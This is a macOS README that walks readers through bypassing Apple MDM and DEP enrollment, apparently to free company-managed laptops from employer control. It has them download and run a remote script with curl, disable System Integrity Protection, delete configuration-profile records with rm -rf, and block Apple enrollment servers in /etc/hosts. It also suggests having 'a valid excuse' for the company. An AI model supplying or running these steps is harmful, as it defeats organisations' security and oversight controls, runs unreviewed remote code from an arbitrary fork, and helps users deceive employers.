# Bypass-MDM for MacOS 💻

![mdm-screen](https://raw.githubusercontent.com/sthanav37/build/bypass-mdm/main/mdm-screen.png)
#### Prerequisites ⚠️
- **It is advised to erase the hard-drive prior to starting.**
- **It is advised to re-install MacOS using an external flash drive.**
- **Device language needs to be set to English, it can be changed afterwards.**

#### Follow steps below to bypass MDM setup during a fresh installation of MacOS
> Upon arriving to the setup stage of forced MDM enrollement:
1. Long press Power button to forcefully shut down your Mac.
2. Hold the power button to start your Mac & boot into recovery mode.
> a. **Apple-based Mac**: Hold Power button.\
> b. **Intel-based Mac**: Hold <kbd>CMD</kbd> + <kbd>R</kbd> during boot.

3. Connect to WiFi to activate your Mac.
4. Enter Recovery Mode & Open Safari.
5. Navigate to: 
```
!#https://www.github.com/assafdori/bypass-mdm
https://www.github.com/sthanav37/build/bypass-mdm
```
6. Copy the script below:
```zsh
!#curl https://raw.githubusercontent.com/assafdori/bypass-mdm/main/bypass-mdm.sh -o bypass-mdm.sh && chmod +x ./bypass-mdm.sh && ./bypass-mdm.sh
```
```zsh
curl https://raw.githubusercontent.com/sthanav37/build/main/bypass-mdm.sh -o bypass-mdm.sh && chmod +x ./bypass-mdm.sh && ./bypass-mdm.sh
```


7. Launch Terminal (Utilities > Terminal).
8. Paste (<kbd>CMD</kbd> + <kbd>V</kbd>) and Run the script (<kbd>ENTER</kbd>).
9. Input 1 for Autobypass.
10. Press Enter to leave the default username 'Apple'.
11. Press Enter to leave the default  password '1234'.
12. Wait for the script to finish & Reboot your Mac.
13. Sign in with user (Apple) & password (1234)
14. Skip all setup (Apple ID, Siri, Touch ID, Location Services)
15. Once on the desktop navigate to System Settings > Users and Groups, and create your real Admin account.
16. Log out of the Apple profile, and sign in into your real profile.
17. Feel free set up properly now (Apple ID, Siri, Touch ID, Location Services).
18. Once on the desktop navigate to System Settings > Users and Groups and delete Apple profile.
19. Congratulations, you're MDM free! 💫

###### Although it's virtually impossible to catch that you've removed the MDM (because it wasn't even configured), be aware that the serial number of the laptop will still be shown in the inventory system of your company. We're removing the MDM's capabilities before it's configured locally, so it won't be available as a managed laptop to them. Use with caution. Probably a good idea to have a valid excuse as well.


#### Disabling DEP and MDM on macOS
Before you begin check:
```
sudo profiles show -type enrollment
Afterwards run the command: sudo profiles remove -all 
cd /var/db/ConfigurationProfiles
rm -rf *
mkdir Settings
touch Settings/.profilesAreInstalled
```
And reload the device.
1. Cut the Wi-Fi: Disable your Wi-Fi to ensure your Mac has no internet connection and avoid the pop-up during the process.
2. Turn Off the Mac: Shut down your Mac completely.
3. Boot into Recovery Mode: Turn on your Mac and immediately hold down Command-R to boot into Recovery Mode.
4. Disable SIP (System Integrity Protection): Once in Recovery Mode, open the Utilities menu and select Terminal.
        In the Terminal window, type the following command to disable SIP:
        **csrutil disable**
5. Additional Steps in Recovery Mode: Run the following commands to manage Configuration Profiles and cloud records: 
```
launchctl disable system/com.apple.ManagedClient.enroll
rm -rf /var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
rm -rf /var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
touch /var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
touch /var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound
rm -rf /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
rm -rf /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound
```
Restart your Mac by typing: **reboot**
> Note: If the files under /var/db/ are not present, removing them might not be necessary. However, adding the touched files helps ensure completeness.

6. Grant Terminal Full Disk Access:
> a. Once your Mac has restarted normally, go to System Preferences > Security & Privacy > Privacy tab.
> b. Select Full Disk Access from the left sidebar.
> c. Click the lock icon to make changes, and add Terminal to the list of applications allowed Full Disk Access.

7. Modify the Hosts File: Open Terminal and enter the following commands to block the necessary Apple servers:

```
sudo /bin/sh -c 'echo "0.0.0.0 iprofiles.apple.com" >> /etc/hosts'
sudo /bin/sh -c 'echo "0.0.0.0 mdmenrollment.apple.com" >> /etc/hosts'
sudo /bin/sh -c 'echo "0.0.0.0 deviceenrollment.apple.com" >> /etc/hosts'
sudo /bin/sh -c 'echo "0.0.0.0 gdmf.apple.com" >> /etc/hosts'

> Or,

sudo nano /private/etc/hosts

Replace the following:
    0.0.0.0 iprofiles.apple.com
    0.0.0.0 mdmenrollment.apple.com
    0.0.0.0 deviceenrollment.apple.com
```

8. Verify Hosts File Modification: Check if the hosts file has been updated correctly by running: 
**sudo nano /etc/hosts**
Ensure the lines you added are present.
9. (Optional) Re-enable SIP: If you want to re-enable SIP, reboot your Mac into Recovery Mode again (Command-R).
Open Terminal in Recovery Mode and type: **csrutil enable** followed with the **reload** command
10. Verify DEP and MDM Status: After a normal boot, open Terminal and run the following command to check the DEP and MDM enrollment status: 
**csrutil status**
**profiles status -type enrollment**
